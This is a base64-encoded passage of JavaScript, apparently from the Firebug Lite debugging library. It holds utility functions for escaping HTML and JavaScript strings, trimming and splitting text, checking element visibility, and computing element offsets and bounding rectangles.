9yQ3NzID0gY3JlYXRlU2ltcGxlRXNjYXBlKCdjc3MnLCAnbm9ybWFsJyk7DQoNCi8vIGRlcHJlY2F0ZWQgY29tcGF0aWJpbGl0eSBmdW5jdGlvbnMNCi8vdGhpcy5kZXByZWNhdGVFc2NhcGVIVE1MID0gY3JlYXRlU2ltcGxlRXNjYXBlKCd0ZXh0JywgJ25vcm1hbCcpOw0KLy90aGlzLmRlcHJlY2F0ZWRVbmVzY2FwZUhUTUwgPSBjcmVhdGVTaW1wbGVFc2NhcGUoJ3RleHQnLCAncmV2ZXJzZScpOw0KLy90aGlzLmVzY2FwZUhUTUwgPSBkZXByZWNhdGVkKCJ1c2UgYXBwcm9wcmlhdGUgZXNjYXBlRm9yLi4uIGZ1bmN0aW9uIiwgdGhpcy5kZXByZWNhdGVFc2NhcGVIVE1MKTsNCi8vdGhpcy51bmVzY2FwZUhUTUwgPSBkZXByZWNhdGVkKCJ1c2UgYXBwcm9wcmlhdGUgdW5lc2NhcGVGb3IuLi4gZnVuY3Rpb24iLCB0aGlzLmRlcHJlY2F0ZWRVbmVzY2FwZUhUTUwpOw0KDQp2YXIgZXNjYXBlRm9yU291cmNlTGluZSA9IHRoaXMuZXNjYXBlRm9yU291cmNlTGluZSA9IGNyZWF0ZVNpbXBsZUVzY2FwZSgndGV4dCcsICdub3JtYWwnKTsNCg0KdmFyIHVuZXNjYXBlV2hpdGVzcGFjZSA9IGNyZWF0ZVNpbXBsZUVzY2FwZSgnd2hpdGVzcGFjZScsICdyZXZlcnNlJyk7DQoNCnRoaXMudW5lc2NhcGVGb3JUZXh0Tm9kZSA9IGZ1bmN0aW9uKHN0cikNCnsNCiAgICBpZiAoRmlyZWJ1Zy5zaG93VGV4dE5vZGVzV2l0aFdoaXRlc3BhY2UpDQogICAgICAgIHN0ciA9IHVuZXNjYXBlV2hpdGVzcGFjZShzdHIpOw0KICAgIGlmICghRmlyZWJ1Zy5zaG93VGV4dE5vZGVzV2l0aEVudGl0aWVzKQ0KICAgICAgICBzdHIgPSBlc2NhcGVGb3JFbGVtZW50QXR0cmlidXRlKHN0cik7DQogICAgcmV0dXJuIHN0cjsNCn07DQoNCnRoaXMuZXNjYXBlTmV3TGluZXMgPSBmdW5jdGlvbih2YWx1ZSkNCnsNCiAgICByZXR1cm4gdmFsdWUucmVwbGFjZSgvXHIvZywgIlxcciIpLnJlcGxhY2UoL1xuL2csICJcXG4iKTsNCn07DQoNCnRoaXMuc3RyaXBOZXdMaW5lcyA9IGZ1bmN0aW9uKHZhbHVlKQ0Kew0KICAgIHJldHVybiB0eXBlb2YodmFsdWUpID09ICJzdHJpbmciID8gdmFsdWUucmVwbGFjZSgvW1xyXG5dL2csICIgIikgOiB2YWx1ZTsNCn07DQoNCnRoaXMuZXNjYXBlSlMgPSBmdW5jdGlvbih2YWx1ZSkNCnsNCiAgICByZXR1cm4gdmFsdWUucmVwbGFjZSgvXHIvZywgIlxcciIpLnJlcGxhY2UoL1xuL2csICJcXG4iKS5yZXBsYWNlKCciJywgJ1xcIicsICJnIik7DQp9Ow0KDQpmdW5jdGlvbiBlc2NhcGVIVE1MQXR0cmlidXRlKHZhbHVlKQ0Kew0KICAgIGZ1bmN0aW9uIHJlcGxhY2VDaGFycyhjaCkNCiAgICB7DQogICAgICAgIHN3aXRjaCAoY2gpDQogICAgICAgIHsNCiAgICAgICAgICAgIGNhc2UgIiYiOg0KICAgICAgICAgICAgICAgIHJldHVybiAiJmFtcDsiOw0KICAgICAgICAgICAgY2FzZSAiJyI6DQogICAgICAgICAgICAgICAgcmV0dXJuIGFwb3M7DQogICAgICAgICAgICBjYXNlICciJzoNCiAgICAgICAgICAgICAgICByZXR1cm4gcXVvdDsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gIj8iOw0KICAgIH07DQogICAgdmFyIGFwb3MgPSAiJiMzOTsiLCBxdW90ID0gIiZxdW90OyIsIGFyb3VuZCA9ICciJzsNCiAgICBpZiggdmFsdWUuaW5kZXhPZignIicpID09IC0xICkgew0KICAgICAgICBxdW90ID0gJyInOw0KICAgICAgICBhcG9zID0gIiciOw0KICAgIH0gZWxzZSBpZiggdmFsdWUuaW5kZXhPZigiJyIpID09IC0xICkgew0KICAgICAgICBxdW90ID0gJyInOw0KICAgICAgICBhcm91bmQgPSAiJyI7DQogICAgfQ0KICAgIHJldHVybiBhcm91bmQgKyAoU3RyaW5nKHZhbHVlKS5yZXBsYWNlKC9bJiciXS9nLCByZXBsYWNlQ2hhcnMpKSArIGFyb3VuZDsNCn0NCg0KDQpmdW5jdGlvbiBlc2NhcGVIVE1MKHZhbHVlKQ0Kew0KICAgIGZ1bmN0aW9uIHJlcGxhY2VDaGFycyhjaCkNCiAgICB7DQogICAgICAgIHN3aXRjaCAoY2gpDQogICAgICAgIHsNCiAgICAgICAgICAgIGNhc2UgIjwiOg0KICAgICAgICAgICAgICAgIHJldHVybiAiJmx0OyI7DQogICAgICAgICAgICBjYXNlICI+IjoNCiAgICAgICAgICAgICAgICByZXR1cm4gIiZndDsiOw0KICAgICAgICAgICAgY2FzZSAiJiI6DQogICAgICAgICAgICAgICAgcmV0dXJuICImYW1wOyI7DQogICAgICAgICAgICBjYXNlICInIjoNCiAgICAgICAgICAgICAgICByZXR1cm4gIiYjMzk7IjsNCiAgICAgICAgICAgIGNhc2UgJyInOg0KICAgICAgICAgICAgICAgIHJldHVybiAiJnF1b3Q7IjsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gIj8iOw0KICAgIH07DQogICAgcmV0dXJuIFN0cmluZyh2YWx1ZSkucmVwbGFjZSgvWzw+JiInXS9nLCByZXBsYWNlQ2hhcnMpOw0KfQ0KDQp0aGlzLmVzY2FwZUhUTUwgPSBlc2NhcGVIVE1MOw0KDQp0aGlzLmNyb3BTdHJpbmcgPSBmdW5jdGlvbih0ZXh0LCBsaW1pdCkNCnsNCiAgICB0ZXh0ID0gdGV4dCArICIiOw0KDQogICAgaWYgKCFsaW1pdCkNCiAgICAgICAgdmFyIGhhbGZMaW1pdCA9IDUwOw0KICAgIGVsc2UNCiAgICAgICAgdmFyIGhhbGZMaW1pdCA9IGxpbWl0IC8gMjsNCg0KICAgIGlmICh0ZXh0Lmxlbmd0aCA+IGxpbWl0KQ0KICAgICAgICByZXR1cm4gdGhpcy5lc2NhcGVOZXdMaW5lcyh0ZXh0LnN1YnN0cigwLCBoYWxmTGltaXQpICsgIi4uLiIgKyB0ZXh0LnN1YnN0cih0ZXh0Lmxlbmd0aC1oYWxmTGltaXQpKTsNCiAgICBlbHNlDQogICAgICAgIHJldHVybiB0aGlzLmVzY2FwZU5ld0xpbmVzKHRleHQpOw0KfTsNCg0KdGhpcy5pc1doaXRlc3BhY2UgPSBmdW5jdGlvbih0ZXh0KQ0Kew0KICAgIHJldHVybiAhcmVOb3RXaGl0ZXNwYWNlLmV4ZWModGV4dCk7DQp9Ow0KDQp0aGlzLnNwbGl0TGluZXMgPSBmdW5jdGlvbih0ZXh0KQ0Kew0KICAgIHZhciByZVNwbGl0TGluZXMyID0gLy4qKDo/XHJcbnxcbnxccik/L21nOw0KICAgIHZhciBsaW5lczsNCiAgICBpZiAodGV4dC5tYXRjaCkNCiAgICB7DQogICAgICAgIGxpbmVzID0gdGV4dC5tYXRjaChyZVNwbGl0TGluZXMyKTsNCiAgICB9DQogICAgZWxzZQ0KICAgIHsNCiAgICAgICAgdmFyIHN0ciA9IHRleHQrIiI7DQogICAgICAgIGxpbmVzID0gc3RyLm1hdGNoKHJlU3BsaXRMaW5lczIpOw0KICAgIH0NCiAgICBsaW5lcy5wb3AoKTsNCiAgICByZXR1cm4gbGluZXM7DQp9Ow0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp0aGlzLnNhZmVUb1N0cmluZyA9IGZ1bmN0aW9uKG9iKQ0Kew0KICAgIGlmICh0aGlzLmlzSUUpDQogICAgew0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gRklYTUU6IHh4eHBlZHJvIHRoaXMgaXMgZmFpbGluZyBpbiBJRSBmb3IgdGhlIGdsb2JhbCAiZXh0ZXJuYWwiIG9iamVjdA0KICAgICAgICAgICAgcmV0dXJuIG9iICsgIiI7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2goRSkNCiAgICAgICAgew0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoIkxpYi5zYWZlVG9TdHJpbmcoKSBmYWlsZWQgZm9yICIsIG9iKTsNCiAgICAgICAgICAgIHJldHVybiAiIjsNCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICB0cnkNCiAgICB7DQogICAgICAgIGlmIChvYiAmJiAidG9TdHJpbmciIGluIG9iICYmIHR5cGVvZiBvYi50b1N0cmluZyA9PSAiZnVuY3Rpb24iKQ0KICAgICAgICAgICAgcmV0dXJuIG9iLnRvU3RyaW5nKCk7DQogICAgfQ0KICAgIGNhdGNoIChleGMpDQogICAgew0KICAgICAgICAvLyB4eHhwZWRybyBpdCBpcyBub3Qgc2FmZSB0byB1c2Ugb2IrIiI/DQogICAgICAgIHJldHVybiBvYiArICIiOw0KICAgICAgICAvLy9yZXR1cm4gIlthbiBvYmplY3Qgd2l0aCBubyB0b1N0cmluZygpIGZ1bmN0aW9uXSI7DQogICAgfQ0KfTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCnRoaXMuaGFzUHJvcGVydGllcyA9IGZ1bmN0aW9uKG9iKQ0Kew0KICAgIHRyeQ0KICAgIHsNCiAgICAgICAgZm9yICh2YXIgbmFtZSBpbiBvYikNCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0gY2F0Y2ggKGV4Yykge30NCiAgICByZXR1cm4gZmFsc2U7DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIFN0cmluZyBVdGlsDQoNCnZhciByZVRyaW0gPSAvXlxzK3xccyskL2c7DQp0aGlzLnRyaW0gPSBmdW5jdGlvbihzKQ0Kew0KICAgIHJldHVybiBzLnJlcGxhY2UocmVUcmltLCAiIik7DQp9Ow0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gRW1wdHkNCg0KdGhpcy5lbXB0eUZuID0gZnVuY3Rpb24oKXt9Ow0KDQoNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBWaXNpYmlsaXR5DQoNCnRoaXMuaXNWaXNpYmxlID0gZnVuY3Rpb24oZWx0KQ0Kew0KICAgIC8qDQogICAgaWYgKGVsdCBpbnN0YW5jZW9mIFhVTEVsZW1lbnQpDQogICAgew0KICAgICAgICAvL0ZCVHJhY2Uuc3lzb3V0KCJpc1Zpc2libGUgZWx0Lm9mZnNldFdpZHRoOiAiK2VsdC5vZmZzZXRXaWR0aCsiIG9mZnNldEhlaWdodDoiKyBlbHQub2Zmc2V0SGVpZ2h0KyIgbG9jYWxOYW1lOiIrIGVsdC5sb2NhbE5hbWUrIiBuYW1lU3BhY2U6IitlbHQubmFtZVNwYWNlVVJJKyJcbiIpOw0KICAgICAgICByZXR1cm4gKCFlbHQuaGlkZGVuICYmICFlbHQuY29sbGFwc2VkKTsNCiAgICB9DQogICAgLyoqLw0KICAgIA0KICAgIHJldHVybiB0aGlzLmdldFN0eWxlKGVsdCwgInZpc2liaWxpdHkiKSAhPSAiaGlkZGVuIiAmJg0KICAgICAgICAoIGVsdC5vZmZzZXRXaWR0aCA+IDAgfHwgZWx0Lm9mZnNldEhlaWdodCA+IDAgDQogICAgICAgIHx8IGVsdC50YWdOYW1lIGluIGludmlzaWJsZVRhZ3MNCiAgICAgICAgfHwgZWx0Lm5hbWVzcGFjZVVSSSA9PSAiaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciDQogICAgICAgIHx8IGVsdC5uYW1lc3BhY2VVUkkgPT0gImh0dHA6Ly93d3cudzMub3JnLzE5OTgvTWF0aC9NYXRoTUwiICk7DQp9Ow0KDQp0aGlzLmNvbGxhcHNlID0gZnVuY3Rpb24oZWx0LCBjb2xsYXBzZWQpDQp7DQogICAgLy8gSUU2IGRvZXNuJ3Qgc3VwcG9ydCB0aGUgW2NvbGxhcHNlZF0gQ1NTIHNlbGVjdG9yLiBJRTcgZG9lcyBzdXBwb3J0IHRoZSBzZWxlY3RvciwgDQogICAgLy8gYnV0IGl0IGlzIGNhdXNpbmcgYSBidWcgKHRoZSBlbGVtZW50IGRpc2FwcGVhcnMgd2hlbiB5b3Ugc2V0IHRoZSAiY29sbGFwc2VkIiANCiAgICAvLyBhdHRyaWJ1dGUsIGJ1dCBpdCBkb2Vzbid0IGFwcGVhciB3aGVuIHlvdSByZW1vdmUgdGhlIGF0dHJpYnV0ZS4gU28sIGZvciB0aG9zZQ0KICAgIC8vIGNhc2VzLCB3ZSBuZWVkIHRvIHVzZSB0aGUgY2xhc3MgYXR0cmlidXRlLg0KICAgIGlmICh0aGlzLmlzSUVsdDgpDQogICAgew0KICAgICAgICBpZiAoY29sbGFwc2VkKQ0KICAgICAgICAgICAgdGhpcy5zZXRDbGFzcyhlbHQsICJjb2xsYXBzZWQiKTsNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgdGhpcy5yZW1vdmVDbGFzcyhlbHQsICJjb2xsYXBzZWQiKTsNCiAgICB9DQogICAgZWxzZQ0KICAgICAgICBlbHQuc2V0QXR0cmlidXRlKCJjb2xsYXBzZWQiLCBjb2xsYXBzZWQgPyAidHJ1ZSIgOiAiZmFsc2UiKTsNCn07DQoNCnRoaXMub2JzY3VyZSA9IGZ1bmN0aW9uKGVsdCwgb2JzY3VyZWQpDQp7DQogICAgaWYgKG9ic2N1cmVkKQ0KICAgICAgICB0aGlzLnNldENsYXNzKGVsdCwgIm9ic2N1cmVkIik7DQogICAgZWxzZQ0KICAgICAgICB0aGlzLnJlbW92ZUNsYXNzKGVsdCwgIm9ic2N1cmVkIik7DQp9Ow0KDQp0aGlzLmhpZGUgPSBmdW5jdGlvbihlbHQsIGhpZGRlbikNCnsNCiAgICBlbHQuc3R5bGUudmlzaWJpbGl0eSA9IGhpZGRlbiA/ICJoaWRkZW4iIDogInZpc2libGUiOw0KfTsNCg0KdGhpcy5jbGVhck5vZGUgPSBmdW5jdGlvbihub2RlKQ0Kew0KICAgIHZhciBub2RlTmFtZSA9ICIgIiArIG5vZGUubm9kZU5hbWUudG9Mb3dlckNhc2UoKSArICIgIjsNCiAgICB2YXIgaWdub3JlVGFncyA9ICIgdGFibGUgdGJvZHkgdGhlYWQgdGZvb3QgdGggdHIgdGQgIjsNCiAgICANCiAgICAvLyBJRSBjYW4ndCB1c2UgaW5uZXJIVE1MIG9mIHRhYmxlIGVsZW1lbnRzDQogICAgaWYgKHRoaXMuaXNJRSAmJiBpZ25vcmVUYWdzLmluZGV4T2Yobm9kZU5hbWUpICE9IC0xKQ0KICAgICAgICB0aGlzLmVyYXNlTm9kZShub2RlKTsNCiAgICBlbHNlDQogICAgICAgIG5vZGUuaW5uZXJIVE1MID0gIiI7DQp9Ow0KDQp0aGlzLmVyYXNlTm9kZSA9IGZ1bmN0aW9uKG5vZGUpDQp7DQogICAgd2hpbGUgKG5vZGUubGFzdENoaWxkKQ0KICAgICAgICBub2RlLnJlbW92ZUNoaWxkKG5vZGUubGFzdENoaWxkKTsNCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gV2luZG93IGl0ZXJhdGlvbg0KDQp0aGlzLml0ZXJhdGVXaW5kb3dzID0gZnVuY3Rpb24od2luLCBoYW5kbGVyKQ0Kew0KICAgIGlmICghd2luIHx8ICF3aW4uZG9jdW1lbnQpDQogICAgICAgIHJldHVybjsNCg0KICAgIGhhbmRsZXIod2luKTsNCg0KICAgIGlmICh3aW4gPT0gdG9wIHx8ICF3aW4uZnJhbWVzKSByZXR1cm47IC8vIFhYWGpqYiBoYWNrIGZvciBjaHJvbWVCdWcNCg0KICAgIGZvciAodmFyIGkgPSAwOyBpIDwgd2luLmZyYW1lcy5sZW5ndGg7ICsraSkNCiAgICB7DQogICAgICAgIHZhciBzdWJXaW4gPSB3aW4uZnJhbWVzW2ldOw0KICAgICAgICBpZiAoc3ViV2luICE9IHdpbikNCiAgICAgICAgICAgIHRoaXMuaXRlcmF0ZVdpbmRvd3Moc3ViV2luLCBoYW5kbGVyKTsNCiAgICB9DQp9Ow0KDQp0aGlzLmdldFJvb3RXaW5kb3cgPSBmdW5jdGlvbih3aW4pDQp7DQogICAgZm9yICg7IHdpbjsgd2luID0gd2luLnBhcmVudCkNCiAgICB7DQogICAgICAgIGlmICghd2luLnBhcmVudCB8fCB3aW4gPT0gd2luLnBhcmVudCB8fCAhdGhpcy5pbnN0YW5jZU9mKHdpbi5wYXJlbnQsICJXaW5kb3ciKSkNCiAgICAgICAgICAgIHJldHVybiB3aW47DQogICAgfQ0KICAgIHJldHVybiBudWxsOw0KfTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBHcmFwaGljcw0KDQp0aGlzLmdldENsaWVudE9mZnNldCA9IGZ1bmN0aW9uKGVsdCkNCnsNCiAgICB2YXIgYWRkT2Zmc2V0ID0gZnVuY3Rpb24gYWRkT2Zmc2V0KGVsdCwgY29vcmRzLCB2aWV3KQ0KICAgIHsNCiAgICAgICAgdmFyIHAgPSBlbHQub2Zmc2V0UGFyZW50Ow0KDQogICAgICAgIC8vL3ZhciBzdHlsZSA9IGlzSUUgPyBlbHQuY3VycmVudFN0eWxlIDogdmlldy5nZXRDb21wdXRlZFN0eWxlKGVsdCwgIiIpOw0KICAgICAgICB2YXIgY2hyb21lID0gRmlyZWJ1Zy5jaHJvbWU7DQogICAgICAgIA0KICAgICAgICBpZiAoZWx0Lm9mZnNldExlZnQpDQogICAgICAgICAgICAvLy9jb29yZHMueCArPSBlbHQub2Zmc2V0TGVmdCArIHBhcnNlSW50KHN0eWxlLmJvcmRlckxlZnRXaWR0aCk7DQogICAgICAgICAgICBjb29yZHMueCArPSBlbHQub2Zmc2V0TGVmdCArIGNocm9tZS5nZXRNZWFzdXJlbWVudEluUGl4ZWxzKGVsdCwgImJvcmRlckxlZnQiKTsNCiAgICAgICAgaWYgKGVsdC5vZmZzZXRUb3ApDQogICAgICAgICAgICAvLy9jb29yZHMueSArPSBlbHQub2Zmc2V0VG9wICsgcGFyc2VJbnQoc3R5bGUuYm9yZGVyVG9wV2lkdGgpOw0KICAgICAgICAgICAgY29vcmRzLnkgKz0gZWx0Lm9mZnNldFRvcCArIGNocm9tZS5nZXRNZWFzdXJlbWVudEluUGl4ZWxzKGVsdCwgImJvcmRlclRvcCIpOw0KDQogICAgICAgIGlmIChwKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAocC5ub2RlVHlwZSA9PSAxKQ0KICAgICAgICAgICAgICAgIGFkZE9mZnNldChwLCBjb29yZHMsIHZpZXcpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIG90aGVyVmlldyA9IGlzSUUgPyBlbHQub3duZXJEb2N1bWVudC5wYXJlbnRXaW5kb3cgOiBlbHQub3duZXJEb2N1bWVudC5kZWZhdWx0VmlldzsNCiAgICAgICAgICAgIC8vIElFIHdpbGwgZmFpbCB3aGVuIHJlYWRpbmcgdGhlIGZyYW1lRWxlbWVudCBwcm9wZXJ0eSBvZiBhIHBvcHVwIHdpbmRvdy4NCiAgICAgICAgICAgIC8vIFdlIGRvbid0IG5lZWQgaXQgYW55d2F5IG9uY2UgaXQgaXMgb3V0c2lkZSB0aGUgKHBvcHVwKSB2aWV3cG9ydCwgc28gd2UncmUNCiAgICAgICAgICAgIC8vIGlnbm9yaW5nIHRoZSBmcmFtZUVsZW1lbnQgY2hlY2sgd2hlbiB0aGUgd2luZG93IGlzIGEgcG9wdXANCiAgICAgICAgICAgIGlmICghb3RoZXJWaWV3Lm9wZW5lciAmJiBvdGhlclZpZXcuZnJhbWVFbGVtZW50KQ0KICAgICAgICAgICAgICAgIGFkZE9mZnNldChvdGhlclZpZXcuZnJhbWVFbGVtZW50LCBjb29yZHMsIG90aGVyVmlldyk7DQogICAgICAgIH0NCiAgICB9Ow0KDQogICAgdmFyIGlzSUUgPSB0aGlzLmlzSUU7DQogICAgdmFyIGNvb3JkcyA9IHt4OiAwLCB5OiAwfTsNCiAgICBpZiAoZWx0KQ0KICAgIHsNCiAgICAgICAgdmFyIHZpZXcgPSBpc0lFID8gZWx0Lm93bmVyRG9jdW1lbnQucGFyZW50V2luZG93IDogZWx0Lm93bmVyRG9jdW1lbnQuZGVmYXVsdFZpZXc7DQogICAgICAgIGFkZE9mZnNldChlbHQsIGNvb3Jkcywgdmlldyk7DQogICAgfQ0KDQogICAgcmV0dXJuIGNvb3JkczsNCn07DQoNCnRoaXMuZ2V0Vmlld09mZnNldCA9IGZ1bmN0aW9uKGVsdCwgc2luZ2xlRnJhbWUpDQp7DQogICAgZnVuY3Rpb24gYWRkT2Zmc2V0KGVsdCwgY29vcmRzLCB2aWV3KQ0KICAgIHsNCiAgICAgICAgdmFyIHAgPSBlbHQub2Zmc2V0UGFyZW50Ow0KICAgICAgICBjb29yZHMueCArPSBlbHQub2Zmc2V0TGVmdCAtIChwID8gcC5zY3JvbGxMZWZ0IDogMCk7DQogICAgICAgIGNvb3Jkcy55ICs9IGVsdC5vZmZzZXRUb3AgLSAocCA/IHAuc2Nyb2xsVG9wIDogMCk7DQoNCiAgICAgICAgaWYgKHApDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChwLm5vZGVUeXBlID09IDEpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHBhcmVudFN0eWxlID0gdmlldy5nZXRDb21wdXRlZFN0eWxlKHAsICIiKTsNCiAgICAgICAgICAgICAgICBpZiAocGFyZW50U3R5bGUucG9zaXRpb24gIT0gInN0YXRpYyIpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBjb29yZHMueCArPSBwYXJzZUludChwYXJlbnRTdHlsZS5ib3JkZXJMZWZ0V2lkdGgpOw0KICAgICAgICAgICAgICAgICAgICBjb29yZHMueSArPSBwYXJzZUludChwYXJlbnRTdHlsZS5ib3JkZXJUb3BXaWR0aCk7DQoNCiAgICAgICAgICAgICAgICAgICAgaWYgKHAubG9jYWxOYW1lID09ICJUQUJMRSIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvb3Jkcy54ICs9IHBhcnNlSW50KHBhcmVudFN0eWxlLnBhZGRpbmdMZWZ0KTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvb3Jkcy55ICs9IHBhcnNlSW50KHBhcmVudFN0eWxlLnBhZGRpbmdUb3ApOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKHAubG9jYWxOYW1lID09ICJCT0RZIikNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHN0eWxlID0gdmlldy5nZXRDb21wdXRlZFN0eWxlKGVsdCwgIiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgY29vcmRzLnggKz0gcGFyc2VJbnQoc3R5bGUubWFyZ2luTGVmdCk7DQogICAgICAgICAgICAgICAgICAgICAgICBjb29yZHMueSArPSBwYXJzZUludChzdHlsZS5tYXJnaW5Ub3ApOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UgaWYgKHAubG9jYWxOYW1lID09ICJCT0RZIikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGNvb3Jkcy54ICs9IHBhcnNlSW50KHBhcmVudFN0eWxlLmJvcmRlckxlZnRXaWR0aCk7DQogICAgICAgICAgICAgICAgICAgIGNvb3Jkcy55ICs9IHBhcnNlSW50KHBhcmVudFN0eWxlLmJvcmRlclRvcFdpZHRoKTsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICB2YXIgcGFyZW50ID0gZWx0LnBhcmVudE5vZGU7DQogICAgICAgICAgICAgICAgd2hpbGUgKHAgIT0gcGFyZW50KQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgY29vcmRzLnggLT0gcGFyZW50LnNjcm9sbExlZnQ7DQogICAgICAgICAgICAgICAgICAgIGNvb3Jkcy55IC09IHBhcmVudC5zY3JvbGxUb3A7DQogICAgICAgICAgICAgICAgICAgIHBhcmVudCA9IHBhcmVudC5wYXJlbnROb2RlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBhZGRPZmZzZXQocCwgY29vcmRzLCB2aWV3KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChlbHQubG9jYWxOYW1lID09ICJCT0RZIikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgc3R5bGUgPSB2aWV3LmdldENvbXB1dGVkU3R5bGUoZWx0LCAiIik7DQogICAgICAgICAgICAgICAgY29vcmRzLnggKz0gcGFyc2VJbnQoc3R5bGUuYm9yZGVyTGVmdFdpZHRoKTsNCiAgICAgICAgICAgICAgICBjb29yZHMueSArPSBwYXJzZUludChzdHlsZS5ib3JkZXJUb3BXaWR0aCk7DQoNCiAgICAgICAgICAgICAgICB2YXIgaHRtbFN0eWxlID0gdmlldy5nZXRDb21wdXRlZFN0eWxlKGVsdC5wYXJlbnROb2RlLCAiIik7DQogICAgICAgICAgICAgICAgY29vcmRzLnggLT0gcGFyc2VJbnQoaHRtbFN0eWxlLnBhZGRpbmdMZWZ0KTsNCiAgICAgICAgICAgICAgICBjb29yZHMueSAtPSBwYXJzZUludChodG1sU3R5bGUucGFkZGluZ1RvcCk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGlmIChlbHQuc2Nyb2xsTGVmdCkNCiAgICAgICAgICAgICAgICBjb29yZHMueCArPSBlbHQuc2Nyb2xsTGVmdDsNCiAgICAgICAgICAgIGlmIChlbHQuc2Nyb2xsVG9wKQ0KICAgICAgICAgICAgICAgIGNvb3Jkcy55ICs9IGVsdC5zY3JvbGxUb3A7DQoNCiAgICAgICAgICAgIHZhciB3aW4gPSBlbHQub3duZXJEb2N1bWVudC5kZWZhdWx0VmlldzsNCiAgICAgICAgICAgIGlmICh3aW4gJiYgKCFzaW5nbGVGcmFtZSAmJiB3aW4uZnJhbWVFbGVtZW50KSkNCiAgICAgICAgICAgICAgICBhZGRPZmZzZXQod2luLmZyYW1lRWxlbWVudCwgY29vcmRzLCB3aW4pOw0KICAgICAgICB9DQoNCiAgICB9DQoNCiAgICB2YXIgY29vcmRzID0ge3g6IDAsIHk6IDB9Ow0KICAgIGlmIChlbHQpDQogICAgICAgIGFkZE9mZnNldChlbHQsIGNvb3JkcywgZWx0Lm93bmVyRG9jdW1lbnQuZGVmYXVsdFZpZXcpOw0KDQogICAgcmV0dXJuIGNvb3JkczsNCn07DQoNCnRoaXMuZ2V0TFRSQldIID0gZnVuY3Rpb24oZWx0KQ0Kew0KICAgIHZhciBiY3JlY3QsDQogICAgICAgIGRpbXMgPSB7ImxlZnQiOiAwLCAidG9wIjogMCwgInJpZ2h0IjogMCwgImJvdHRvbSI6IDAsICJ3aWR0aCI6IDAsICJoZWlnaHQiOiAwfTsNCg0KICAgIGlmIChlbHQpDQogICAgew0KICAgICAgICBiY3JlY3QgPSBlbHQuZ2V0Qm91bmRpbmdDbGllbnRSZWN0KCk7DQogICAgICAgIGRpbXMubGVmdCA9IGJjcmVjdC5sZWZ0Ow0KICAgICAgICBkaW1zLnRvcCA9IGJjcmVjdC50b3A7DQogICAgICAgIGRpbXMucmlnaHQgPSBiY3JlY3QucmlnaHQ7DQogICAgICAgIGRpbXMuYm90dG9tID0gYmNyZWN0LmJvdHRvbTsNCg0KICAgICAgICBpZihiY3JlY3Qud2lkdGgpDQogICAgICAgIHsNCiAgICAgICAgICAgIGRpbXMud2lkdGggPSBiY3JlY3Qud2lkdGg7DQogICAgICAgICAgICBkaW1zLmhlaWdodCA9IGJjcmVjdC5oZWlnaHQ7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBkaW1zLndpZHRoID0gZGltcy5yaWdodCAtIGRpbXMubGVmdDsNCiAgICAgICAgICAgIGRpbXMuaGVpZ2h0ID0gZGltcy5ib3R0b20gLSBkaW1zLnRvcDsNCiAgICAgICAgfQ0KICAgIH0NCiAgICB